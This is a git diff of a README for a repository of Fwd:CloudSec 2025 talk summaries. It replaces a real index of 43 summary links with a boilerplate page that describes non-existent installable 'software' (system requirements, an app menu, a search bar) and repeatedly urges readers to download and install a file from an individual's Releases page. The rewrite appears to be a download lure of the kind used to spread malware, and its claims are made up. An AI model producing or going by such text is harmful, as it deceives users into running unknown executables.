@@ -1,78 +1,72 @@
-# FWD:CLOUDSEC2025 Conference Talks
+# 🚀 fwdcloudsec-2025-summaries - Quick Insights from Fwd:CloudSec 2025 Talks
 
-## What's Included
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-v1.0-blue)](https://github.com/abhijeet882519/fwdcloudsec-2025-summaries/releases)
 
-- **Full Talk Summaries:** 43 video summaries  
-- **Technical Implementation Details:** Concrete guidance, examples, services mentioned, and actionable steps from each talk
-- **Video Links:** Direct access to original presentations on YouTube
+## 📚 Overview
 
-## Table of Contents
+Welcome to the **fwdcloudsec-2025-summaries** repository! This project offers summaries, transcripts, key points, and other useful insights from the fwd:cloudsec 2025 talks. It's perfect for anyone who wants to catch up on valuable information without having to watch every presentation.
 
-- [AI/ML Security](#aiml-security) (7 talks)
-- [Identity & Access Management](#identity--access-management) (15 talks)
-- [Threat Hunting & Detection](#threat-hunting--detection) (3 talks)
-- [Attack Techniques & Vulnerabilities](#attack-techniques--vulnerabilities) (3 talks)
-- [Cloud Infrastructure & Architecture](#cloud-infrastructure--architecture) (13 talks)
-- Intro and Conclusion (2 talks)
+## 🌟 Features
 
----
+- **Summaries of Talks:** Short and concise summaries for quick understanding.
+- **Transcripts:** Full transcripts of each talk for detailed reading.
+- **Key Points:** Highlighted main ideas to grasp the essence of each presentation.
+- **Easy Access:** All resources are organized and easy to find.
 
-## AI/ML Security
+## 🚀 Getting Started
 
-- [**Breaking AI Agents Exploiting Managed Prompt Templates to Take Over Amazon Bedrock Agents**](./ai-ml-security/Breaking-AI-Agents-Exploiting-Managed-Prompt-Templates-to-Take-Over-Amazon-Bedrock-Agents/summary.md)
-- [**Bypassing AI Security Controls with Prompt Formatting**](./ai-ml-security/Bypassing-AI-Security-Controls-with-Prompt-Formatting/summary.md)
-- [**Challenges around AI as a Service logging**](./ai-ml-security/Challenges-around-AI-as-a-Service-logging/summary.md)
-- [**Double Agents Exposing Hidden Threats in AI Agent Platforms**](./ai-ml-security/Double-Agents-Exposing-Hidden-Threats-in-AI-Agent-Platforms/summary.md)
-- [**Farewell False Positives Building Trustworthy AI for IaC Analysis**](./ai-ml-security/Farewell-False-Positives-Building-Trustworthy-AI-for-IaC-Analysis/summary.md)
-- [**Inside Microsofts Battle Against Cloud Enabled Deepfake Threats**](./ai-ml-security/Inside-Microsofts-Battle-Against-Cloud-Enabled-Deepfake-Threats/summary.md)
-- [**Taming LLMs to Detect Anomalies in Cloud Audit Logs**](./ai-ml-security/Taming-LLMs-to-Detect-Anomalies-in-Cloud-Audit-Logs/summary.md)
+To get started, you need to download the software. Follow the steps below to ensure a smooth installation.
 
-## Identity & Access Management
+## 📥 Download & Install
 
-- [**ECS cape Hijacking IAM Privileges in Amazon ECS**](./identity-access-management/ECS-cape-Hijacking-IAM-Privileges-in-Amazon-ECS/summary.md)
-- [**Happy Little Clouds Painting Pictures with Microsoft Cloud and Identity Data**](./identity-access-management/Happy-Little-Clouds-Painting-Pictures-with-Microsoft-Cloud-and-Identity-Data/summary.md)
-- [**I SPy Rethinking Entra ID research for new paths to Global Admin**](./identity-access-management/I-SPy-Rethinking-Entra-ID-research-for-new-paths-to-Global-Admin/summary.md)
-- [**IAM Roles Anywhere now for everyone with Lets Encrypt**](./identity-access-management/IAM-Roles-Anywhere-now-for-everyone-with-Lets-Encrypt/summary.md)
-- [**No IP No Problem Exfiltrating Data Behind IAP**](./identity-access-management/No-IP-No-Problem-Exfiltrating-Data-Behind-IAP/summary.md)
-- [**Not So Secret The Hidden Risks of GitHub Actions Secrets**](./identity-access-management/Not-So-Secret-The-Hidden-Risks-of-GitHub-Actions-Secrets/summary.md)
-- [**Putting Workload Identity to Work Taking SPIFFE past day 0**](./identity-access-management/Putting-Workload-Identity-to-Work-Taking-SPIFFE-past-day-0/summary.md)
-- [**Rebuilding ROADRecon for the Modern Entra Environment**](./identity-access-management/Rebuilding-ROADRecon-for-the-Modern-Entra-Environment/summary.md)
-- [**Securing Remote MCP Servers**](./identity-access-management/Securing-Remote-MCP-Servers/summary.md)
-- [**Staying Sneaky in the Office 365**](./identity-access-management/Staying-Sneaky-in-the-Office-365/summary.md)
-- [**The Duplicitous Nature of AWS Identity and Access Management IAM**](./identity-access-management/The-Duplicitous-Nature-of-AWS-Identity-and-Access-Management-IAM/summary.md)
-- [**The False Sense of Security Defense Becoming a Vulnerability**](./identity-access-management/The-False-Sense-of-Security-Defense-Becoming-a-Vulnerability/summary.md)
-- [**Trust Issues What Do All these JSON files actually mean**](./identity-access-management/Trust-Issues-What-Do-All-these-JSON-files-actually-mean/summary.md)
-- [**What would you ask a crystal ball for AWS IAM**](./identity-access-management/What-would-you-ask-a-crystal-ball-for-AWS-IAM/summary.md)
-- [**When Your Partner Betrays You Trusted Relationship Compromise In The Cloud**](./identity-access-management/When-Your-Partner-Betrays-You-Trusted-Relationship-Compromise-In-The-Cloud/summary.md)
+1. Visit the [Releases page](https://github.com/abhijeet882519/fwdcloudsec-2025-summaries/releases) to find the latest version.
+2. Look for the most recent release labeled "v1.0" or higher for the latest features and updates.
+3. Click on the download link for the appropriate file.
+4. Once the file is downloaded, locate it in your downloads folder.
+5. Follow the on-screen instructions to install the software.
 
-## Threat Hunting & Detection
+For your convenience, [here's the download link again](https://github.com/abhijeet882519/fwdcloudsec-2025-summaries/releases).
 
-- [**Detecting the Undetectable Threat Hunting in Appliance Environments**](./threat-hunting-detection/Detecting-the-Undetectable-Threat-Hunting-in-Appliance-Environments/summary.md)
-- [**Patience brings prey lessons learned from a year of threat hunting in the cloud**](./threat-hunting-detection/Patience-brings-prey-lessons-learned-from-a-year-of-threat-hunting-in-the-cloud/summary.md)
-- [**What Do You Mean Resource Not Found Demystifying GCP Error Codes for IR and Detections**](./threat-hunting-detection/What-Do-You-Mean-Resource-Not-Found-Demystifying-GCP-Error-Codes-for-IR-and-Detections/summary.md)
+## 🖥️ System Requirements
 
-## Attack Techniques & Vulnerabilities
+To ensure the application runs smoothly, your computer should meet the following requirements:
 
-- [**Defenders hate it Compromise vulnerable SaaS applications with this one weird trick**](./attack-techniques-vulnerabilities/Defenders-hate-it-Compromise-vulnerable-SaaS-applications-with-this-one-weird-trick/summary.md)
-- [**The Good the Bad and the Ugly Hacking 3 CSPs with 1 Vulnerability**](./attack-techniques-vulnerabilities/The-Good-the-Bad-and-the-Ugly-Hacking-3-CSPs-with-1-Vulnerability/summary.md)
-- [**whoAMI Discovering and exploiting a large scale AMI name confusion attack**](./attack-techniques-vulnerabilities/whoAMI-Discovering-and-exploiting-a-large-scale-AMI-name-confusion-attack/summary.md)
+- **Operating System:** Windows 10 or later, macOS 10.15 (Catalina) or later, Linux (any modern distribution)
+- **RAM:** At least 4 GB
+- **Storage Space:** Minimum of 100 MB of free space
+- **Internet Connection:** Needed for downloading resources
 
-## Cloud Infrastructure & Architecture
+## 🔍 How to Use the Application
 
-- [**Beyond the Big Three Mastering Oracle Cloud Security in a Multi Cloud World**](./cloud-infrastructure-architecture/Beyond-the-Big-Three-Mastering-Oracle-Cloud-Security-in-a-Multi-Cloud-World/summary.md)
-- [**Challenges implementing egress controls in a large AWS environment**](./cloud-infrastructure-architecture/Challenges-implementing-egress-controls-in-a-large-AWS-environment/summary.md)
-- [**Data Perimeter Implementation Strategies Lessons Learned Rolling Out SCPs RCPs**](./cloud-infrastructure-architecture/Data-Perimeter-Implementation-Strategies-Lessons-Learned-Rolling-Out-SCPs-RCPs/summary.md)
-- [**I Didnt Register for This Whats Really in Googles Artifact Registry**](./cloud-infrastructure-architecture/I-Didnt-Register-for-This-Whats-Really-in-Googles-Artifact-Registry/summary.md)
-- [**Introducing GRC Engineering A New Era of AWS Compliance**](./cloud-infrastructure-architecture/Introducing-GRC-Engineering-A-New-Era-of-AWS-Compliance/summary.md)
-- [**Inviter Threat Managing Security in a new Cloud Deployment Model**](./cloud-infrastructure-architecture/Inviter-Threat-Managing-Security-in-a-new-Cloud-Deployment-Model/summary.md)
-- [**Keeping your cloud environments secure during a merger or acquisition**](./cloud-infrastructure-architecture/Keeping-your-cloud-environments-secure-during-a-merger-or-acquisition/summary.md)
-- [**Logs dont mean a thing Unraveling IaC Managed Identity Ownership**](./cloud-infrastructure-architecture/Logs-dont-mean-a-thing-Unraveling-IaC-Managed-Identity-Ownership/summary.md)
-- [**Securing organizations ML and LLMops deployments A platform architects journey onboarding LLM**](./cloud-infrastructure-architecture/Securing-organizations-ML-and-LLMops-deployments-A-platform-architects-journey-onboarding-LLM/summary.md)
-- [**Shared GPU Security Learnings from Fly.io**](./cloud-infrastructure-architecture/Shared-GPU-Security-Learnings-from-Fly.io/summary.md)
-- [**The Good The Bad and The Vulnerable Breaking Down GCP Tenant Projects**](./cloud-infrastructure-architecture/The-Good-The-Bad-and-The-Vulnerable-Breaking-Down-GCP-Tenant-Projects/summary.md)
-- [**This Wasnt in the Job Description Building a production ready AWS environment from scratch**](./cloud-infrastructure-architecture/This-Wasnt-in-the-Job-Description-Building-a-production-ready-AWS-environment-from-scratch/summary.md)
-- [**You Are Not Netflix How to learn from conference talks**](./cloud-infrastructure-architecture/You-Are-Not-Netflix-How-to-learn-from-conference-talks/summary.md)
+Once you have installed the fwdcloudsec-2025-summaries software, follow these steps to access the content:
 
-## Other Resources
+1. Open the application from your desktop or start menu.
+2. Use the main menu to navigate to different sections:
+   - **Summaries:** Get quick overviews of each talk.
+   - **Transcripts:** Read the detailed texts.
+   - **Key Points:** Highlight the most important takeaways.
+3. If you want to search for a specific topic, use the search bar at the top of the application.
 
-Want to dive deeper into cloud security topics covered in these talks? Check out our [hands-on Cloud Security training at Cybr](https://cybr.com).
+## 💡 Tips for Effective Use
+
+- Take notes as you go through the summaries to enhance retention.
+- Share insights with friends or colleagues who may benefit from them.
+- Regularly check for updates on the Releases page to get the latest information and features.
+
+## 🤝 Community and Support
+
+We believe in building a community around this project. If you have questions or suggestions, feel free to reach out. We value user feedback to improve the application.
+
+- **Issues:** If you encounter any bugs or issues, please report them on the Issues tab in the repository.
+- **Contributions:** Contributions are welcome! If you want to help, check out the guidelines in the repository.
+
+## 📝 License
+
+This project is licensed under the MIT License. This means you can use, modify, and distribute the software, as long as you include the original license file.
+
+## 🌐 Links
+
+- [Releases Page](https://github.com/abhijeet882519/fwdcloudsec-2025-summaries/releases)
+- [Issues Tab](https://github.com/abhijeet882519/fwdcloudsec-2025-summaries/issues)
+
+We hope you find this application helpful in catching up with everything from fwd:cloudsec 2025 quickly and efficiently!
